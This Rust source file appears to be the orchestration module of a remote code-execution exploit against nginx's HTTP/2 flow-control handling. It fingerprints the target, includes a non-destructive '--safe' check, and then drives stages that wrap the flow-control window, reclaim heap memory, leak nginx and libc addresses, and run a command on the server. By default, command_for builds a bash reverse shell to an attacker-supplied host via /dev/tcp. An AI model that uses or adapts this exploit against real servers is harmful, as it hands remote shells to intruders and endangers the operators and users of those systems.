//! Stage orchestration and mode entry points.

use std::time::Duration;

use anyhow::{bail, Result};

use crate::bootstrap::{self, CarrierState};
use crate::profile::{schedule_key, Profile};
use crate::reclaim;
use crate::target::{self, Config};

pub struct ExploitResult {
    pub holder: u64,
    pub nginx: u64,
    pub libc: u64,
    pub profile: String,
    pub plaintext_gib: f64,
    pub auxiliaries: usize,
}

/// Narrow the candidate profiles using facts visible before disclosure.
pub fn select_candidates(
    profiles: &[Profile],
    settings: &[(u16, u32)],
    server_header: Option<&str>,
    body_size: usize,
) -> Result<Vec<Profile>> {
    let mut matches = Vec::new();
    for profile in profiles {
        if settings != profile.fingerprint.http2_settings.as_slice() {
            continue;
        }
        if server_header != Some(profile.fingerprint.server_header.as_str()) {
            continue;
        }
        let required = profile
            .http
            .release_range_end
            .max(profile.http.one_byte_range_start)
            .max(profile.http.layout_range_end);
        let remaining = 65535i64 - 2 * body_size as i64;
        if body_size as u64 > profile.transport.http2_output_chunk_bytes
            || required >= body_size as i64
            || remaining <= 0
        {
            continue;
        }
        let additional = (remaining - 1) / body_size as i64;
        if 3 + additional != profile.http.initial_request_count as i64 {
            continue;
        }
        matches.push(profile.clone());
    }
    if matches.is_empty() {
        let observed = format!(
            "server={:?} settings={:?} body={} bytes",
            server_header, settings, body_size
        );
        let expected = profiles
            .iter()
            .map(|profile| {
                format!(
                    "{}: server={:?} settings={:?} expects {} requests on {}",
                    profile.name,
                    profile.fingerprint.server_header,
                    profile.fingerprint.http2_settings,
                    profile.http.initial_request_count,
                    profile.http.primary_path
                )
            })
            .collect::<Vec<_>>()
            .join("\n      ");
        bail!(
            "no validated profile matches the target ({observed}).\n      \n      Validated profiles:\n      {expected}\n      \n      Run --safe first: it needs no profile and answers whether the bug is present."
        );
    }
    if matches
        .iter()
        .map(schedule_key)
        .collect::<std::collections::HashSet<_>>()
        .len()
        != 1
    {
        bail!(
            "in-band fingerprint leaves incompatible schedules: {}",
            matches.iter().map(|p| p.name.clone()).collect::<Vec<_>>().join(", ")
        );
    }
    Ok(matches)
}

pub struct SafeReport {
    pub settings: Vec<(u16, u32)>,
    pub server_header: Option<String>,
    pub body_size: usize,
    pub target_resets: usize,
    pub release_bytes: usize,
    pub ping_ack: bool,
    pub connection_open: bool,
}

/// Summarize only what the session actually observed.
fn summarize<T: crate::tls::Transport>(
    session: &crate::h2::Session<T>,
    boot: &bootstrap::Bootstrap,
    settings: Vec<(u16, u32)>,
    server_header: Option<String>,
    body_size: usize,
) -> SafeReport {
    let target_resets = boot
        .target_streams
        .iter()
        .filter(|stream| {
            session.frames.iter().any(|frame| {
                frame.kind == crate::h2::RST_STREAM
                    && frame.stream == **stream
                    && frame.error_code == Some(crate::h2::FLOW_CONTROL_ERROR)
            })
        })
        .count();
    let release_bytes = session
        .responses
        .get(&boot.release_stream)
        .map(|response| response.body.len())
        .unwrap_or(0);
    SafeReport {
        settings,
        server_header,
        body_size,
        target_resets,
        release_bytes,
        ping_ack: session.received_ping_ack(0, b"H2HBKEY0"),
        connection_open: session.is_open(),
    }
}

/// `--safe`: prove the accounting bug, then stop. Never sends a corrupting
/// length, never crashes a worker.
pub fn run_safe(config: &mut Config, path: &[u8]) -> Result<SafeReport> {
    let mut probe = target::probe(config, path)?;
    config.http.primary_path = path.to_vec();
    config.set_http_runtime(&probe.body, false)?;
    eprintln!(
        "  resource={} bytes={} settings={:?}",
        String::from_utf8_lossy(path),
        probe.body.len(),
        probe.settings
    );
    let result = bootstrap::run_bootstrap(config, &mut probe.session, true);
    if let Err(error) = &result {
        eprintln!("  [diag] connection={:?}", probe.session.end);
        for frame in &probe.session.frames {
            if matches!(frame.kind, crate::h2::RST_STREAM | crate::h2::GOAWAY) {
                eprintln!(
                    "  [diag] frame kind={} stream={} error={:?}",
                    frame.kind, frame.stream, frame.error_code
                );
            }
        }
        let mut streams: Vec<u32> = probe.session.responses.keys().copied().collect();
        streams.sort_unstable();
        for stream in streams {
            let response = &probe.session.responses[&stream];
            eprintln!(
                "  [diag] stream {stream}: status={:?} body={}",
                response.status,
                response.body.len()
            );
        }
        eprintln!("  [diag] buffered={} frames={}", probe.session.buffer.len(), probe.session.frames.len());
        let start = probe.session.frames.len().saturating_sub(10);
        for frame in &probe.session.frames[start..] {
            eprintln!(
                "  [diag] tail kind={} flags={} stream={} len={} err={:?}",
                frame.kind, frame.flags, frame.stream, frame.length, frame.error_code
            );
        }
        eprintln!("  [diag] error: {error:#}");
    }
    let boot = result?;
    Ok(summarize(
        &probe.session,
        &boot,
        probe.settings.clone(),
        probe.server_header.clone(),
        probe.body.len(),
    ))
}


pub fn run_exploit(config: &mut Config, accounting_confirmed: &mut bool) -> Result<ExploitResult> {
    let path = config.http.primary_path.clone();
    let mut probe = target::probe(config, &path)?;
    let candidates = select_candidates(
        &config.profiles,
        &probe.settings,
        probe.server_header.as_deref(),
        probe.body.len(),
    )?;
    config.apply_profile(candidates[0].clone());
    config.profiles = candidates;
    if config.command.len() > config.profile.heap.command_max_bytes {
        bail!(
            "command is {} bytes; the selected profile allows {}",
            config.command.len(),
            config.profile.heap.command_max_bytes
        );
    }
    config.set_http_runtime(&probe.body, true)?;
    eprintln!(
        "  profile candidates: {}; body={} bytes; schedule={} full + range 0-{}",
        config.profiles.len(),
        probe.body.len(),
        config.http.initial_additional_full_responses,
        config.http.initial_range_end
    );

    let bootstrap = bootstrap::run_bootstrap(config, &mut probe.session, false)?;
    *accounting_confirmed = true;
    eprintln!(
        "  accounting bug confirmed; wrapped window starts at {:#x}, next stream {}",
        bootstrap.send_window, bootstrap.next_stream
    );
    let carrier: CarrierState = bootstrap::reach_wrapped_window(
        config,
        &mut probe.session,
        bootstrap.send_window,
        bootstrap.next_stream,
    )?;
    eprintln!("  wrapped flow-control distance reached");
    let mut auxiliaries = bootstrap::open_auxiliaries(config)?;
    let prepared = reclaim::prepare_reclaim_stage(config, &mut probe.session, &carrier, &mut auxiliaries)?;
    let plan = reclaim::capture_and_forge(config, &mut probe.session, &carrier, &prepared)?;
    reclaim::release_and_dispatch(config, &mut probe.session, &prepared, &plan, &mut auxiliaries)?;

    let transport = &config.profile.transport;
    let plaintext = transport.bootstrap_application_bytes
        + transport.bootstrap_key_updates * 5
        + carrier.first.application_bytes
        + carrier.bulk.application_bytes
        + carrier.numeric_updates * 13;
    let result = ExploitResult {
        holder: plan.holder,
        nginx: plan.nginx,
        libc: plan.libc,
        profile: config.profile.name.clone(),
        plaintext_gib: plaintext as f64 / (1u64 << 30) as f64,
        auxiliaries: auxiliaries.len(),
    };
    for mut auxiliary in auxiliaries {
        auxiliary.close();
    }
    probe.session.close();
    Ok(result)
}

/// Resolve the command executed on the target. Must fit the profile limit.
pub fn command_for(args: &crate::cli::Args, profile: &Profile) -> Result<Vec<u8>> {
    let command = match &args.cmd {
        Some(command) => command.clone(),
        None => {
            let lhost = args
                .lhost
                .ok_or_else(|| anyhow::anyhow!("a reverse shell needs --lhost (or use --cmd)"))?;
            format!(
                "bash -i >& /dev/tcp/{lhost}/{} 0>&1",
                args.lport
            )
        }
    };
    let bytes = command.into_bytes();
    if bytes.contains(&0) {
        bail!("command must not contain NUL");
    }
    if bytes.len() > profile.heap.command_max_bytes {
        bail!(
            "command is {} bytes; profile limit is {}",
            bytes.len(),
            profile.heap.command_max_bytes
        );
    }
    Ok(bytes)
}

pub fn verification_timeout(args: &crate::cli::Args) -> Duration {
    Duration::from_secs(args.shell_timeout)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::h2::{self, Session};
    use crate::tls::Transport;
    use std::io;
    use std::time::Duration;

    struct Fake;
    impl Transport for Fake {
        fn recv(&mut self, _max: usize) -> io::Result<Vec<u8>> {
            Err(io::Error::new(io::ErrorKind::WouldBlock, "idle"))
        }
        fn send(&mut self, _plaintext: &[u8]) -> io::Result<()> {
            Ok(())
        }
        fn send_event(&mut self, _plaintext: &[u8]) -> io::Result<()> {
            Ok(())
        }
        fn set_read_timeout(&mut self, _timeout: Duration) {}
        fn set_backpressure_window(&mut self, _bytes: i32) -> io::Result<()> {
            Ok(())
        }
        fn close(&mut self) {}
    }

    #[test]
    fn safe_summary_reports_only_observed_frames() {
        let mut session = Session::new(Fake);
        session.frames.push(h2::FrameInfo {
            stage: "test".into(),
            kind: h2::RST_STREAM,
            flags: 0,
            stream: 149,
            length: 4,
            error_code: Some(h2::FLOW_CONTROL_ERROR),
            setting_pairs: None,
            opaque: None,
            settings: None,
        });
        session.frames.push(h2::FrameInfo {
            stage: "test".into(),
            kind: h2::RST_STREAM,
            flags: 0,
            stream: 151,
            length: 4,
            error_code: Some(h2::FLOW_CONTROL_ERROR),
            setting_pairs: None,
            opaque: None,
            settings: None,
        });
        session.frames.push(h2::FrameInfo {
            stage: "test".into(),
            kind: h2::PING,
            flags: h2::ACK,
            stream: 0,
            length: 8,
            error_code: None,
            setting_pairs: None,
            opaque: Some(b"H2HBKEY0".to_vec()),
            settings: None,
        });
        let mut response = h2::Response::default();
        response.status = Some("206".into());
        response.body = vec![0u8; 10];
        session.responses.insert(155, response);
        let boot = bootstrap::Bootstrap {
            send_window: 0,
            next_stream: 157,
            release_stream: 155,
            target_streams: [149, 151],
        };
        let report = summarize(
            &session,
            &boot,
            vec![(3, 128)],
            Some("nginx/1.31.8".into()),
            896,
        );
        assert_eq!(report.target_resets, 2);
        assert_eq!(report.release_bytes, 10);
        assert!(report.ping_ack);
        assert_eq!(report.body_size, 896);
        assert_eq!(report.server_header.as_deref(), Some("nginx/1.31.8"));
    }

    #[test]
    fn fingerprint_failure_explains_what_to_do() {
        let profiles = crate::profile::load_builtins().unwrap();
        let error = select_candidates(&profiles, &[(3, 1)], Some("nginx/0.0.0"), 66)
            .unwrap_err()
            .to_string();
        assert!(error.contains("Run --safe first"), "{error}");
        assert!(error.contains("server="), "{error}");
        assert!(error.contains("body=66 bytes"), "{error}");
    }

    #[test]
    fn narrowing_selects_the_matching_embedded_profile() {
        let profiles = crate::profile::load_builtins().unwrap();
        let legacy = profiles
            .iter()
            .find(|profile| profile.name.contains("1.31.6"))
            .unwrap()
            .clone();
        let settings = legacy.fingerprint.http2_settings.clone();
        let candidates = select_candidates(
            &profiles,
            &settings,
            Some(&legacy.fingerprint.server_header),
            896,
        )
        .unwrap();
        assert_eq!(candidates.len(), 1);
        assert_eq!(candidates[0].name, legacy.name);
        assert_eq!(candidates[0].transport.negative_distance, 13880);
    }
}
